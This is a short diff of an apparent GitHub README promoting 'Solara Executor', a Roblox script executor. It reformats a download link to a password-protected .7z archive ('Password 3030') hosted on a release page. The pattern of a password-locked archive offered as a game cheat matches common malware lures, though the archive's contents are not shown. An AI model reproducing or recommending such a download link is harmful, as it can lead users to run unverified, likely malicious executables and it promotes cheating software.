@@ -1,8 +1,8 @@
 # Password 3030
 
-#[Download](https://github.com/jerryrblx/Solara-Script/releases/download/Enjoy!/solara-executor.7z)
+# [Download](https://github.com/jerryrblx/Solara-Script/releases/download/Enjoy!/solara-executor.7z)
 
-https://github.com/jerryrblx/Solara-Script/releases/download/Enjoy!/solara-executor.7z
+
 
 💡 Solara Executor: Revolutionizing Roblox Gameplay with Advanced Script Execution! 🌟
 
